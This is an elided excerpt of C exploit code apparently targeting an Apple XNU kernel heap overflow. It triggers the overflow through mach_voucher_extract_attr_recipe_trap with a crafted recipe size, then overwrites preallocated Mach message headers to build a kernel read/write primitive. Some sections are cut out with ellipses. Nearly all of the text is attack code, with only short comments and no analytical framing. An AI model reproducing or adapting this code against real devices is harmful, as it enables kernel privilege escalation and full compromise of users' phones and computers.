...
int do_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t* overflow_data) {
    ...
    *(uint64_t*)recipe_size = kalloc_size;
    ...
    mach_port_t mport = get_voucher();
    //trigger the heap overflow!

    mach_voucher_extract_attr_recipe_trap( mport, 1, recipe, recipe_size);
...
uint64_t prepare_kernel_rw() {
    ...
    uint64_t overflow_bytes[] = {0x109c-0x30,0,0,0,0,0,0,0};
    ...
    // send a message to the first port; overwriting the header of the second prealloc ed message
    // with a legitmate header:
  
  
    uint64_t valid_header[] = {0x10,0x11,0x12,0x13,0x14,0x15,0x16,0xc40,0,0,0,0,0,0,0};

    send_prealloc_msg(first_port, valid_header, 16);

      // send a message to the second port; writing a pointer to itself in the prealloc buffer
    send_prealloc_msg(second_port, valid_header, 16);
